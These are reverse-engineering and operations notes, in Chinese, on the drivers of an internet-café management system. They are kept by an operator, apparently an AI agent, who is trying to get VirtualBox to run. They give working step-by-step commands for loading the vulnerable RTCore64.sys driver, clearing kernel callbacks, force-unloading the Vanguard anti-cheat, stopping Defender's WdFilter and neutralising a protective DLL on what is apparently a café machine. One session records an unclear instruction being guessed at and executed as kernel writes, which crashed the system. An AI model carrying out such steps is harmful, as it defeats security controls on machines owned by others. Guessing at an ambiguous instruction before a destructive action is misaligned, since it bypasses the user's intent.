call +0x184C   → 初始化内部数据结构
call +0x1630   → ZwAllocateVirtualMemory(-1, 0x260 bytes) 分配 APC payload 区
                  偏移 +0x90 = UNICODE_STRING "kshut64.dll" / "kshut.dll"
                  偏移 +0x92 = 模块路径（32/64 位按 OS 选择）
call +0x2AAC   → PsSetCreateProcessNotifyRoutine(callback=+0x1D3C, FALSE)
call +0x24E8   → PsSetLoadImageNotifyRoutine(...)
call +0x28F0   → IoCreateDevice(...)
MmGetSystemRoutineAddress("ZwQueryInformationProcess")  → 动态解析，存入 .data
IoCreateDevice → 注册 IOCTL 设备
```

#### 2. CreateProcess 回调（+0x1D3C）

```c
// 签名: VOID NotifyRoutine(PEPROCESS Process, HANDLE Pid, PPS_CREATE_NOTIFY_INFO Info)
if (Info == NULL) goto exit;           // 进程退出通知，忽略
PsLookupProcessByProcessId(Pid, &proc)
GetImageFileName(proc)                 // EPROCESS+0x5C = ImageFileName
// 遍历白名单（.data 中的 Unicode 字符串列表）：
//   clsmn.exe / pubwinclient.exe / rsclient.exe /
//   explorer.exe / winlogon.exe / ...（网吧云客户端进程）
if (process_in_whitelist) goto exit;   // 保护云客户端进程，放行
KeWaitForSingleObject(mutex)           // 序列化
RegisterForApcInjection(Pid)           // 记录目标 PID，排队 APC
KeReleaseMutex(mutex)
```

#### 3. APC 注入（+0x1A80 区域）

```c
ZwOpenProcess(Pid, PROCESS_VM_OPERATION|PROCESS_VM_WRITE)  // DesiredAccess=0x10000000
// 分配内存已在 DriverEntry 完成，payload 区在 VBox 进程地址空间
// payload 结构（偏移 +0x90）:
//   UNICODE_STRING.Length      = 按 kshut64.dll 字符数
//   UNICODE_STRING.MaxLength   = Length + 2
//   UNICODE_STRING.Buffer      = 指向 payload+0xA0 的 L"kshut64.dll" 字符串
KeInitializeApc(apc, thread, OriginalApcEnvironment,
                KernelRoutine, RundownRoutine, NormalRoutine, UserMode, payload)
KeInsertQueueApc(apc, arg1=NULL, arg2=NULL, 0)
// NormalRoutine 在 VBox 线程用户态上下文中执行 LdrLoadDll("kshut64.dll")
```

注意：`KeInitializeApc` / `KeInsertQueueApc` 通过 **函数指针表** 调用
（`call qword ptr [rsi]` / `call qword ptr [rsi+8]`，不是直接 IAT），
绕过简单的 IAT 扫描。

#### 4. kshut64.dll DllMain

```c
// DLL_PROCESS_ATTACH → 直接 kill VBox
SetUnhandledExceptionFilter(NULL);     // 关闭崩溃处理器
UnhandledExceptionFilter(exception);   // 走默认路径
GetCurrentProcess();
TerminateProcess(self, 0xC0000409);    // STATUS_STACK_BUFFER_OVERRUN
```

用 `0xC0000409` 而非 `0x1` 是**刻意伪装**：
让人以为是 VBox 自身 /GS security cookie 失败，而非被外力终止。

---

### MmGetSystemRoutineAddress 解析目标

| 调用位置 | 解析的函数名 |
|----------|-------------|
| +0x33FF  | `ZwQueryInformationProcess` |

用途：查询 VBox 进程的 PEB、ImageFileName 等信息，辅助白名单比对。

---

### 白名单进程（.data Unicode 字符串，网吧云客户端）

```
clsmn.exe          pubwinclient.exe     rsclient.exe
explorer.exe       winlogon.exe         ...
```

VirtualBox 不在白名单 → 必然触发 APC 注入。

---

### 修复方案：隐藏 kshut64.dll

APC 注入的最后一步是在 VBox 进程用户态调用 `LdrLoadDll`，
如果 `kshut64.dll` 文件不存在（或被重命名），加载失败，VBox 毫发无损。

```cmd
# 找到 kshut64.dll 实际安装位置
where /r C:\ kshut64.dll

# 将其重命名（比删除更安全，便于恢复）
ren C:\path\to\kshut64.dll kshut64.dll.bak
ren C:\path\to\kshut.dll   kshut.dll.bak
```

备选方案（不修改文件系统）：
- ObMaster `/ndisable` 注销 kshutdown64 的 CreateProcess notify routine
  - 回调 RVA +0x1D3C，在运行时 VA = `ImageBase + 0x1D3C`
  - 用 `PsSetCreateProcessNotifyRoutine(callback, TRUE)` 从回调数组移除

---

### 各驱动角色总结

> ppm-engine v0.2.2 静态分析验证，2026-04-11（PC44 网咖实机）

| 驱动 | ppm 类型 | 真实职能 | 对 VBox 的威胁 |
|------|---------|---------|---------------|
| ksafecenter64.sys | `protection_minifilter` | ObCallback 进程保护 + CmCallback 注册表保护 + ImageLoad notify + Minifilter；无 DriverUnload | L1/L2/L3（已全部绕过）；CmCallback 仅拦截注册表写入，**不是 evil handle 来源**（逆向已证伪）|
| **kshutdown64.sys** | `apc_injector` | APC 注入 kshut64.dll 杀非白名单进程；Process/ImageLoad notify；无 DriverUnload；MmGetSystemRoutineAddress 动态解析 | **L4（kshut64.dll 已中和）** |
| **kboot64.sys** | `apc_injector` | PnP 硬件配置 + 网络设置 + **CmCallback + APC 注入 + EPROCESS DKOM**；无 DriverUnload；服务名 `kboot` | **高 — APC 注入能力 + CmCallback 可能是 evil handle 来源** |
| vgk64.sys | `apc_injector` (packed) | Valorant Vanguard 反作弊；EPROCESS DKOM；无 DriverUnload | 中 — ObCallback 干扰 VBox handle |
| kcachec64.sys | `process_monitor` | PsSetCreateProcessNotifyRoutine 进程监控；无 DriverUnload；MmGetSystemRoutineAddress | 中 — 进程监控，可能上报或辅助 kshutdown |
| KScsiDisk64.sys | `process_monitor` | SCSI 磁盘过滤 + Process/ImageLoad notify；无 DriverUnload；MmGetSystemRoutineAddress | 低（磁盘驱动但有进程监控） |
| krestore64.sys | `generic_driver` | 磁盘影子还原；无 DriverUnload；MmGetSystemRoutineAddress；**EPROCESS DKOM** | 低（有 DKOM 能力） |
| kdisk64.sys | `generic_driver` | 磁盘控制；无 DriverUnload | 无 |
| kantiarp64.sys | `generic_driver` | ARP 防火墙；无 DriverUnload | 无 |
| kpowershutdown64.sys | `generic_driver` | 电源/关机控制；无 DriverUnload | 无 |

---

## kshutdown64.sys 逆向分析（2026-04-08）

### 导入表分析

```
PsSetCreateProcessNotifyRoutine  — 监控所有新进程创建
PsSetLoadImageNotifyRoutine      — 监控模块加载
ZwQueryValueKey                  — 启动时从注册表读配置
ZwAllocateVirtualMemory          — 在目标进程分配内存
KeInitializeApc + KeInsertQueueApc — 内核 APC 注入
ZwOpenProcess                    — 打开目标进程
IoCreateDevice                   — 创建设备对象供 kshut64.dll 通信
```

### 架构：双路径进程终止

```
路径一（内核）：
  PsSetCreateProcessNotifyRoutine 回调
    → 检查新进程名是否在黑名单
    → ZwAllocateVirtualMemory 在目标进程分配 shellcode
    → KeInsertQueueApc 注入 APC → 目标进程执行 ExitProcess

路径二（用户态）：
  kshut64.dll 注入 winlogon.exe
    → DllMain 起线程，OpenEvent 等待驱动信号
    → 驱动 IoCreateDevice 通知 → dll 调 TerminateProcess
```

### 进程名单机制

kshutdown64.sys 内嵌两类名单（宽字符串，直接写在 .text/.data 段）：

**白名单（系统进程，绝不终止）**：
`csrss.exe` `smss.exe` `wininit.exe` `winlogon.exe` `lsass.exe` `explorer.exe`

**本地基础黑名单（已知外挂进程）**：
`checkudo.exe` `udo.exe` `ucheck.exe` `clientprc.exe` `jxclient.exe`
`knbclient.exe` `pubwinclient.exe` `yqsclient.exe` `rsclient.exe`
`clsmn.exe` `entry.exe` `runme.exe` `rwyncmc.exe` `sdfox.exe` `qsd.exe` `JFUserClient.exe`

**VirtualBox 不在本地名单里** — 验证：本机单独加载 kshutdown64.sys 后 VirtualBox 正常运行。

### 网咖 VBox 被杀的真正原因

名单分为两层：
1. **本地硬编码名单**：上述基础外挂进程，写死在 sys 里
2. **远端下发名单**：ksafe 管理服务器推送，包含 `VirtualBox.exe`、`VBoxSVC.exe`、`VBoxManage.exe` 等虚拟化工具

网咖连接管理服务器后，服务端把虚拟化软件加进黑名单推到客户端，kshutdown64 收到后立即终止相关进程。

### VirtualBox vs 雷电模拟器的差异

| | VirtualBox | 雷电模拟器 |
|---|---|---|
| 内核驱动 | `VBoxDrv.sys` `VBoxSup.sys`（ring0） | 无内核驱动 |
| ksafe 处置 | **服务端下发黑名单，直接终止** | 不触发，放行 |
| 原因 | 内核级虚拟化可绕过反作弊监控 | 纯用户态 Android 模拟，无 ring0 访问 |

结论：ksafe 的黑名单粒度做到**驱动级别**，有内核驱动的虚拟化方案一律封杀，纯用户态模拟器放行。

### PDB 路径

```
D:\kygx2019\trunk\bin\kshutdown64.pdb
```

内部项目路径，确认为「云更新（YunGengXin）」自研驱动，非第三方组件。

---

## kboot64.sys 逆向分析（2026-04-09）

### 基本信息

| 项 | 值 |
|----|-----|
| 文件大小 | 222,400 bytes |
| 架构 | x64 |
| 导入表 | **无 IAT**，所有内核函数动态解析 |
| 服务名 | `kboot`（不是 `kboot64`） |
| 设备名 | `\Device\kboot` / `\DosDevices\kboot` |
| PDB | 未暴露 |
| 版本 | 2025.6.15.23946 |

### 性质

**不是安全/保护驱动，是启动时 PnP 硬件配置驱动。**
负责在网吧客户机启动时完成所有硬件驱动的安装与网络配置，
是整个云更新客户端环境的底层基础设施。

### 主要功能

#### 1. PnP 设备安装（开机自动适配硬件）

对以下设备类型进行驱动安装/注册：
- 音频：HDA（`High Definition Audio Device_YGX`，`ven_1002/10DE/8086/1022` = AMD/Nvidia/Intel/AMD 音频）
- USB：Root Hub、USB Hub、Input Device、Audio、Video、Composite Device
- 存储：AHCI（`msahci`）、IDE（`atapi`）、USB 存储
- 显卡：PCI 显卡（基于 VEN/DEV ID 匹配，读 `.ini`/`.reh` 配置文件）
- 网卡：PCI NIC（配置 IP/子网/网关/DNS/MAC）
- 输入：PS/2 键盘（`i8042prt`）、PS/2 鼠标
- 主板：CPU（Intel `intelppm` / AMD `amdppm`）、PCI 桥、PCI-ISA 桥

所有设备名称均追加 `_YGX` 后缀作为云更新标记。

#### 2. 网络配置

```
Services\Tcpip\Parameters\Interfaces\%s:
  EnableDHCP, IPAddress, SubnetMask, DefaultGateway, NameServer
Control\ComputerName\ActiveComputerName  → 设置机器名
Services\kboot\DevIdInfo                → 记录网卡 DevId/InstId
Services\kboot\Linkage                  → NIC linkage
```

支持 `UseExistingNIC` 模式（复用已有网卡，不重新配置）。

#### 3. Fastboot 模式控制

```
fbState 注册表值
"%s-> about to enter fastboot mode"
"%s-> wake from fastboot mode, status=%x"
```

控制 Windows 快速启动/唤醒周期，配合无盘还原系统使用。

#### 4. 设备配置文件系统

读取 `\SystemRoot\System32\drivers\VEN_%04X&DEV_%04X&SUBSYS_%08X&REV_00.ini`（设备配置）
和对应的 `.reh`（注册表导出/hook 文件）、`.rei` 文件，
动态完成驱动注册表项写入。

#### 5. CmRegisterCallbackEx（注册表回调）

```
CmCallbackGetKeyObjectID  ← 字符串出现，说明注册了 CmCallback
reg callback found ParentIdPrefix, ...
```

**这是 ksafecenter64 之外的另一个 CmCallback 来源。**
kboot64 用注册表回调监控设备枚举过程（`CurrentControlSet\Enum` 子键变化），
以便实时响应新设备插入并自动安装驱动。

#### 6. krestore 集成

```
services\krestore
UpperFilters
control\class\{4D36E967-E325-11CE-BFC1-08002BE10318}  ← 磁盘设备类
```

将 krestore64.sys 注册为磁盘设备的 UpperFilter，实现磁盘影子还原。

#### 7. lwclient64 拉起

```
"lwclient64 startup"
```

kboot64 在完成硬件初始化后拉起 lwclient64（云更新主客户端进程）。

### 关键注册表路径

```
\Registry\Machine\System\KPNP                    ← 云更新 PnP 设备数据库
services\kboot\Linkage                           ← NIC linkage
services\kboot\DevIdInfo                         ← 网卡设备 ID 信息
\Registry\Machine\SYSTEM\CurrentControlSet\LogForKboot  ← kboot 日志
```

### 对 VBox 的威胁评估

kboot64 本身不会主动终止进程（无 `ZwTerminateProcess`、`KeInsertQueueApc` 等）。
**但其 CmCallback 是潜在的 evil handle 来源**：
当 VBox 启动时若触发设备枚举相关的注册表操作，kboot64 的回调可能开
`PROCESS_ALL_ACCESS` handle 到 VBox，同 ksafecenter64 的 CmCallback 机制类似。

### 卸载方法修正

之前 `/force-stop kboot64` 失败，原因是服务名写错。正确命令：

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop kboot
```

---

## kssd.exe 逆向分析（2026-04-09）

### 基本信息

| 项 | 值 |
|----|-----|
| 文件大小 | 11,147,744 bytes（~10.6 MB） |
| 架构 | x64 |
| 框架 | MFC 14.0（`AfxWnd140su`） |
| 协议 | Protocol Buffers（protobuf） |
| PDB | `D:\kygx2019\trunk\bin\kssd.pdb` |
| 外部依赖 | `kgamemgr64.dll` |

### 性质

**游戏存储管理客户端（SSD Game Manager）。**
云更新网吧系统的游戏盘管理 GUI，负责游戏下载、更新、配置同步。
不是安全驱动，不直接参与进程保护或杀进程。

### 主要功能（基于 protobuf 消息定义）

#### 1. 游戏磁盘管理

```
getgamediskinfo_req/ack          — 查询游戏磁盘信息
getgamediskstatistic_req/ack     — 游戏磁盘统计
getgameonlineclientinfo_ack      — 在线客户端信息
getssdgames_response             — 获取 SSD 上的游戏列表
CMD_CLI_GETSSDGAMEINFO_response  — 获取单个游戏信息
```

#### 2. P2P 游戏下载/更新

```
P2P_SM_ADDTASK_req               — 添加 P2P 下载任务
UPDATE_SM_ADDTASK_req            — 添加更新任务
CMD_UPT_SYNCFILE_REQ             — 文件同步请求
CMD_UPT_MAKEINDEX_REQ            — 生成文件索引
UPDATE_SM_ALLTASKSTATUS_res      — 所有任务状态
P2P_SM_STOPTASK/SUSPENDTASK/RESUMETASK — 任务控制
```

#### 3. 游戏配置同步

```
CMD_KSVR_CONSL_GETGAMECONFIG_request/response   — 获取游戏配置
CMD_KSVR_CONSL_SETGAMECONFIG_request            — 设置游戏配置
CMD_KSVR_MNG_SYNCGAMECONFIG_request/response    — 同步游戏配置
```

#### 4. 游戏黑名单检查（⚠️ 与 VBox 被杀相关）

```
COM_SM_CHECKBANGAME_req          — 检查游戏是否在黑名单
  字段: gamename, gamepath
```

kssd 向服务端查询黑名单，收到结果后通知 kshutdown64 执行终止。
**kssd 是黑名单的传递链路，不是执行者。**

#### 5. 实时游戏统计上报

```
CMD_KSVR_CLI_REPORTPLAYGAME_request     — 上报玩游戏记录
CMD_KSVR_CONSL_GETPLAYGAMEREALTIME_*    — 实时游戏数据查询
```

#### 6. PnP 驱动数据库管理

```
P2P_ADDPNP_DB_req
  字段: db.os, db.inf, db.devicename, db.drvver, db.build
P2P_SM_ADDPNPTASK_req
```

配合 kboot64 管理硬件驱动的 P2P 分发数据库（从服务端下载驱动 .inf 文件）。

#### 7. UI 功能

- `CFullScreenImpl`，`CScreenWnd`：全屏游戏启动界面
- Explorer 策略：`NoRun`、`NoDrives`、`RestrictRun`、`NoClose` — 限制用户桌面操作（网吧管控）

### 对 VBox 的威胁评估

kssd.exe **不直接杀 VBox**。威胁路径：

```
服务端下发黑名单（包含 VirtualBox.exe 等）
    ↓
kssd.exe COM_SM_CHECKBANGAME_req 拿到结果
    ↓
通知 kshutdown64.sys
    ↓
kshutdown64 APC 注入 kshut64.dll → TerminateProcess
```

已中和（kshut64.dll 重命名 + winlogon 卸载），kssd 的通知无法执行。

---

## 第四次实战（2026-04-09）

### 环境说明

实战在另一台安装了云更新的 Windows 10 19045 机器上进行（非本机）。
ObMaster.exe + RTCore64.sys 位于 `F:\ObMaster\`。

---

### 执行步骤与结果

#### Step 1：注册并启动 RTCore64

```cmd
sc create RTCore64 type=kernel binPath=F:\ObMaster\RTCore64.sys
sc start RTCore64
```

状态：✅ 成功，BYOVD 内核读写原语就绪。

---

#### Step 2：禁用 ksafecenter64 ObCallback

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /disable
```

结果：✅ ksafecenter64 的 `OB_CALLBACK_ENTRY.PreOp` 全部清零，`Enabled=0`。

---

#### Step 3：禁用所有 notify routines

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /ndisable PspLoadImageNotifyRoutine
sudo su root "F:\ObMaster\build\ObMaster.exe" /ndisable PspCreateProcessNotifyRoutine
sudo su root "F:\ObMaster\build\ObMaster.exe" /ndisable PspCreateThreadNotifyRoutine
```

结果：✅ ksafecenter64 / kshutdown64 / vgk 的 LoadImage、CreateProcess、CreateThread 回调全部注销。

---

#### Step 4：卸载 vgk.sys

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop vgk
```

结果：✅ vgk 完全卸载。

---

#### Step 5：中和 kshut64.dll（文件重命名 + winlogon 卸载）

**文件重命名（阻断 LdrLoadDll 路径）：**

```cmd
ren C:\Windows\System32\kshut64.dll kshut64.dll.bak
```

结果：✅ kshut64.dll 文件不再可被加载。

**从 winlogon 卸载已注入的 dll：**

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /wluninject kshut64.dll
```

结果：✅ winlogon.exe 中的 kshut64.dll 被 FreeLibrary 卸载，等待驱动信号的线程终止。

---

#### Step 6：卸载 kshutdown64.sys

先用 `/objdir --kva` 拿 DRIVER_OBJECT VA：

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /objdir --kva \Driver\kshutdown64
```

再卸载：

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /drv-unload kshutdown64 <VA>
sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop kshutdown64
```

结果：✅ kshutdown64 停止，CreateProcess 回调不再触发。

---

#### Step 7：停止 WdFilter 及辅助进程

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /runas system "net stop WdFilter /y"
```

结果：✅ WdFilter 停止。
额外：lwclient64.exe、kssd.exe、lwhardware64.exe 进程一并终止。

---

#### Step 8：尝试卸载 kboot64

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop kboot64
```

结果：❌ `STATUS_OBJECT_NAME_NOT_FOUND` — 名字对不上，服务实际注册为 `kboot`，不是 `kboot64`。
应试 `/force-stop kboot`。当时未发现，跳过。（见"kboot64.sys 逆向分析"章节）

---

#### Step 9：ksafecenter64 zombie 仍阻塞

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /drv-zombie <ksafecenter_DO_VA>
```

输出：2 个 DeviceObjects，DevObj[1] RefCount=1，清零不粘（内核持续恢复）。
尝试 `/drv-unload` + `/force-stop`：失败，DeviceObject 引用未释放。

**ksafecenter64 zombie 问题根因：**
CmRegisterCallbackEx 注册的注册表回调仍然活跃。当 VBox 启动时访问注册表，
registry callback 触发 → `ObOpenObjectByPointer` → System (PID 4) 新开
`PROCESS_ALL_ACCESS (0x1FFFFF)` handle → VBoxSup 的 evil handle 检查触发 → VBox abort (-3738)。

注：ObCallback / notify 禁用并不影响 CmCallback，两者独立。

---

### 遭遇 BSOD

**经过：**
上述所有 notify + ObCallback + kshut64 全部中和后，VBox 仍因 PID 4 evil handle abort。
用户要求按 `ksafe_architecture.md` 策略 D 对 VBoxVM.exe 做 PPL 保护，但输入的指令是 **"PEX"** 而非 "PPL"。

**BSOD 原因（待查）：**

会话因 BSOD 终止，记录未能保存，确切操作无法还原。目前存在两种可能：

1. **误解 "PEX" 为 EPROCESS 字段操作**：向 `OBJECT_HEADER.SecurityDescriptor` 写入 NULL
   → Bugcheck 0x189 BAD_OBJECT_HEADER

2. **忽略 "PEX" 含义，继续强行处理 kboot64**：kboot64 无服务注册表项，
   `/force-stop` 已失败，若随后尝试直接操作 DRIVER_OBJECT 内核结构强制卸载，
   命中无效地址或破坏内核对象 → BSOD

两种路径都不排除。因 BSOD 后会话记录丢失，无法确认。

**教训（无论哪种）：**
- 遇到不明指令（"PEX"）必须停下来确认，不能靠猜直接执行内核写操作
- 正常路径走不通的驱动（如 kboot64）不应升级到硬写内核结构，需先分析再行动

**正确操作（PPL 保护，未执行）：**
```
sudo su root "F:\ObMaster\build\ObMaster.exe" /make-ppl <vboxpid> 0x72
```
`0x72` = `PsProtectedTypeProtectedLight (2) | PsProtectedSignerWindows (7<<4)`
写入 `EPROCESS+0x87a`，让 VBox 变成 PPL，ksafecenter ObCallback 的 PreOp
拿到的 `DesiredAccess` 会被内核自动降级（Protected Process 互相保护规则），
从而在 ObCallback 层面就拒掉 PROCESS_ALL_ACCESS。

---

### 当前状态总结

| 层 | 内容 | 状态 |
|----|------|------|
| vgk ObCallback | Valorant 反作弊 | ✅ 卸载 |
| ksafecenter ObCallback | PreOp 清零 | ✅ 禁用 |
| ksafecenter LoadImage notify | 注销 | ✅ 禁用 |
| kshutdown64 CreateProcess notify | 注销 | ✅ 禁用 |
| kshut64.dll 文件 | 重命名为 .bak | ✅ 中和 |
| kshut64.dll in winlogon | FreeLibrary 卸出 | ✅ 清除 |
| kshutdown64.sys | sc stop 成功 | ✅ 停止 |
| WdFilter | net stop 成功 | ✅ 停止 |
| kboot64.sys | 无注册表项，无法卸载 | ❌ 残留 |
| ksafecenter64 zombie | DevObj RefCount 不粘 | ❌ 残留 |
| **ksafecenter CmCallback** | **registry callback 仍活跃，触发 evil handle** | ❌ **当前最终阻塞** |
| VBox 启动 | BSOD 前未完成 | ❌ 未达成 |

---

### 下一步

**核心问题：** ksafecenter64 的 `CmRegisterCallbackEx` 注册表回调未被清除。

**解决方案：** 新增 `/notify registry` 命令，扫描 `CmpCallBackVector` 数组，
找到指向 ksafecenter64 地址范围的条目并清零，从根源切断 evil handle 来源。

```
sudo su root "F:\ObMaster\build\ObMaster.exe" /notify registry
```

清除 CmCallback 后，VBox 访问注册表不再触发回调，PID 4 不再开新句柄，
配合 PPL (`/make-ppl <vboxpid> 0x72`) 双重保护，VBox 应可正常启动。

---

## 第五次实战（2026-04-10）

### 目标

实现 `/notify registry` 命令，扫描 `CmpCallBackVector` 内核数组，枚举所有 `CmRegisterCallback` 回调，
并支持 `--kill <driver>` 杀掉指定驱动的条目。

### `/notify registry` 实现

**修改的文件：**
- `src/cmd_notify.cpp` — 新增 `FindCmpCallBackVector()`、`LooksLikeCmArray()`、`CmdNotifyRegistry()`
- `src/commands.h` — 新增声明
- `src/main.cpp` — 新增 `/notify registry [--kill <drv>]` 命令调度与帮助文本

**核心逻辑：**

1. **定位 CmpCallBackVector**（未导出全局变量）：
   - 加载 ntoskrnl.exe 到用户态
   - 扫描 `CmUnRegisterCallback` 和 `CmRegisterCallback` 两个导出函数的前 512 字节
   - 查找 RIP-relative LEA/MOV 指令（`48/4C 8D/8B xx` 且 `(xx & 0xC7) == 0x05`）
   - 只保留指向 `.data` 节的候选地址
   - 用 `LooksLikeCmArray()` 验证每个候选：至少一个 slot 解码为有效 `EX_CALLBACK_ROUTINE_BLOCK`

2. **EX_CALLBACK 结构**（同 Psp* notify 数组）：
   ```
   EX_CALLBACK[100] 数组，每个 8 字节
   slot 非零 → raw & ~0xF = EX_CALLBACK_ROUTINE_BLOCK*
     +0x00 RundownProtect (EX_RUNDOWN_REF)
     +0x08 Function (callback 函数指针)
     +0x10 Context
   ```

3. **Kill 机制**：将匹配驱动名称的 slot 写零 (`g_drv->Wr64(slotAddr, 0)`)

### 修复的 Bug

**Bug 1 — LooksLikeCmArray 验证过松：**
- `FindDriverByAddr` 可能返回非 null 但名字为空串的 owner
- 修复：`if (!owner || owner[0] == L'\0') continue;`

**Bug 2 — 主扫描循环缺少 fn 回指数组过滤：**
- slot 21/22 的 fn 地址指回数组自身（垃圾数据），被误报为有效条目
- 修复：`if (fn >= arrayVA && fn < arrayVA + CM_ARRAY_MAX * 8) continue;`
- 效果：回调数从 17 条降到 11 条

### 深入分析：CmpCallBackVector 垃圾数据问题

**后续测试发现**：数组中大量非零 slot 实际是垃圾数据，不是真正的 CmCallback。

**证据（Code dump）：**
```
slot[3]  fn=FFFFB0075397A910  Code: 10 A9 97 53 07 B0 FF FF  ← LIST_ENTRY Flink（指针），不是代码
slot[8]  fn=FFFFB0072E8802D8  Code: 90 DA BA 31 07 B0 FF FF  ← 又是指针
slot[5]  fn=FFFFF8020972A4D0  Code: 48 83 EC 28 48 83 C1 08  ← sub rsp,0x28 — 真正的 x64 prologue
```

- pool 地址条目（`FFFFB007...`）：fn 指向的不是代码，是 LIST_ENTRY 自引用节点
- ntoskrnl .text 地址条目（slot 54+）：block+0x08 是代码字节不是指针，且有 8-slot 周期重复
- **唯一真实条目**：slot[5] FLTMGR.SYS

**过滤器演进：**
1. code prologue 启发式（检查 fn 第一字节）→ 太严格，把 pool 条目全过滤了
2. block-in-module 检查（block 在已知模块内则跳过）→ 放通了假 pool 条目
3. **正确方案**：fn 指向的第一个 QWORD 如果是 kernel VA（指针），则不是代码

### ksafecenter64 CmCallback 状态分析

**结论：ksafecenter64 当前没有活跃的 CmCallback。**

虽然 `ksafecenter64.sys` 导入了 `CmRegisterCallbackEx`（确认存在于 PE 导入表 offset 0xC194），
但 `CmpCallBackVector` 中只有 FLTMGR 一个真实条目。

**可能原因：**
1. ksafecenter64 的 CmCallback 是**事件驱动**注册的（检测到特定进程启动时才注册）
2. 之前 session 已经清零，ksafecenter64 服务虽在运行但没重新注册
3. 注册发生在更晚的时机（如 VBox 进程实际打开 SUPDrv 设备时）

**验证方法：**
- 启动 VBox VM → 立即重新扫描 `/notify registry` → 看是否出现新条目
- 或监控 CmpCallBackVector 某些空 slot（如 slot 0-2）是否从 0 变为非 0

### `/notify registry` 命令现有能力

```
/notify registry                     — 枚举 CmpCallBackVector 中所有真实 CmCallback
/notify registry --kill <drv>        — 按驱动名杀条目（名称匹配）
/notify registry --kill-kva <dobj>   — 按 DriverObject KVA 做范围匹配杀条目
/notify registry --kill-unknown      — 杀所有 <unknown> 条目
```

代码位置：`src/cmd_notify.cpp` CmdNotifyRegistry()，三条 kill 路径（Path 1/2/3）。

### ksafecenter64 CmCallback 逆向分析（完成）

通过 pefile + capstone 对 `ksafecenter64.sys` 完整逆向，定位了 CmCallback 注册和回调函数：

**注册函数** `0x140007A08`：
```
CmRegisterCallbackEx(
    Function = 0x140007C20,    // callback
    Altitude = L"...",
    Driver   = DriverObject,
    Context  = NULL,
    Cookie   = &g_cookie       // [rip+0xE028] = 0x140015A58
);
```

**回调函数** `0x140007C20`：
```c
NTSTATUS CmCallback(ctx, NotifyClass, Arg2) {
    if (NotifyClass != RegNtPreSetValueKey)  // 只拦截注册表值写入
        return STATUS_SUCCESS;
    
    CmCallbackGetKeyObjectID(cookie, Arg2->Object, NULL, &keyName);
    fullPath = keyName + "\\" + Arg2->ValueName;
    
    // 黑名单 1：精确匹配
    if (RtlCompareUnicodeString(&fullPath, L"\\Registry\\Machine\\SOFTWARE\\kSafeCenter\\...", TRUE) == 0)
        return STATUS_ACCESS_DENIED;  // 0xC0000022
    
    // 黑名单 2：子串匹配（动态配置，运行时从服务端下发）
    if (substring_match(&fullPath, &dynamicBlacklist))
        return STATUS_ACCESS_DENIED;
    
    return STATUS_SUCCESS;
}
```

**注册表路径字符串（PE 中找到）：**
- `\Registry\Machine\SOFTWARE\kSafeCenter` — 保护云更新自己的注册表配置
- `\Registry\Machine\System\CurrentControlSet` — 保护服务启动配置

### ⚠️ 关键结论：CmCallback 不是 evil handle 来源

**ksafecenter64 的 CmCallback 只做注册表写入拦截**（`RegNtPreSetValueKey`），
不涉及进程句柄、不调用 `ObOpenObjectByPointer`、不产生 evil handle。

**evil handle 的真正来源是 `ObRegisterCallbacks`**（`fcn.1400074fc → fcn.1400078b8`）：
- 监控 `OB_OPERATION_HANDLE_CREATE`
- `PsGetProcessId` → `fcn.140007600`（PID 检查）
- 匹配则剥离句柄权限（AND 0xFFFFFFFE, AND 0xFFFFFFF7）

这与第三次实战中用 `/obcb` 清零的是同一个机制。

### 第三次实战中 CmCallback 误判的修正

之前认为"ksafecenter CmRegisterCallbackEx registry callback 仍活跃 → evil handle"是**错误推断**。
实际上：
- CmCallback 只拦截注册表写入，不产生句柄
- evil handle 完全来自 ObCallback（已在第三次实战中清零）
- 第三次 BSOD 的原因需要重新调查（可能与 ObCallback 清零后的竞态条件有关）

### 深度逆向：ksafecenter64 ObOpenObjectByPointer 全调用点分析

通过 pefile + capstone 完整反编译，定位了 ksafecenter64 **所有** `ObOpenObjectByPointer` 调用点：

| 调用点 VA | 所在函数 | DesiredAccess | 用途 |
|-----------|---------|---------------|------|
| `0x140004C10` | `fcn.140004BCC` | `0x200` (QUERY_INFO) | 读取进程映像名（ZwQueryInformationProcess class 0x1B） |
| `0x1400058AF` | `fcn.140005860` | `0x200` (QUERY_INFO) | 读取 PEB（ZwQueryInformationProcess class 0x30 + KeStackAttachProcess） |

**两个调用点都只用 `0x200`，不是 `0x1FFFFF`（PROCESS_ALL_ACCESS）！**

`IsProtectedPid` (`fcn.140007600`) 调用链：
```
ObCallback PreOp (0x1400078B8)
  → PsGetProcessId(Object)
  → IsProtectedPid(pid) at 0x140007600
      → PsLookupProcessByProcessId
      → IoGetCurrentProcess (排除自己)
      → 检查进程存活时间 > 50秒 (0x2FAF080 = 50,000,000 * 100ns)
      → 检查 PID > 4 (排除 System)
      → call 0x140004BCC → ObOpenObjectByPointer(0x200) → 读映像名
      → call 0x140005860 → ObOpenObjectByPointer(0x200) → 读 PEB
      → 字符串匹配检查
      → return true/false
```

### ⚠️ 重要结论：第三次实战的推断链有误

文档 line 2144-2149 的推断：
> "CmRegisterCallbackEx → ObOpenObjectByPointer → evil handle (0x1FFFFF)"

**这是错的。** 逆向证实：
1. CmCallback 里没有 ObOpenObjectByPointer（只做注册表路径字符串比对）
2. ksafecenter64 的 ObOpenObjectByPointer 只用 0x200，不产生 0x1FFFFF 句柄

**0x1FFFFF 的 evil handle 可能来源：**
1. **kboot64.sys** — 无 IAT，所有函数动态解析，有 CmRegisterCallbackEx 且尚未完整逆向
2. **Windows 内核自身** — 进程创建时 System 可能默认获得 ALL_ACCESS handle（正常行为），
   但 VBoxSup hardening 将其视为 evil
3. **ksafecenter64 的 ObCallback 禁用后的遗留** — PreOp 清零只阻止了权限剥夺，
   不阻止其他驱动或内核自身创建 0x1FFFFF 句柄

### 下一步

1. **对 kboot64.sys 做 ObOpenObjectByPointer 调用点分析**（无 IAT，需要字节码搜索动态解析的函数指针）
2. **重新测试 VBox**：在只禁用 ksafecenter ObCallback + 所有 notify + 卸载 kshutdown/vgk/WdFilter 后，
